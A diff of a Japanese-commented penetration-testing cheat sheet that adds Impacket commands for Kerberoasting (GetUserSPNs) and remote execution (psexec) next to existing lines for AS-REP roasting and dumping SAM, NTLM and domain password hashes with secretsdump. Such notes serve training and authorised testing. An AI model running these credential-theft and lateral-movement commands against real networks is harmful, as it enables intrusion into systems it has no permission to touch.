@@ -10,6 +10,7 @@ impacket-secretsdump -sam <file> -system <file> LOCAL #SAMとsystemのハッシ�
 #上記のディレクトリに移動して直接pythonスクリプトを動かすときと、impacketコマンドから実行するときで結果が違った。両方試せ
 
 ./GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手
+impacket-GetUserSPNs <domain name>/<user>:<pass> -dc-ip <IP> -request #TGSを入手
 ./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #複製権限があるユーザで全員のNTLMをダンプ
 impacket-secretsdump <domain>/<user>:<pass>@<IP> #ドメイン情報からパスワードダンプ
-
+impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec
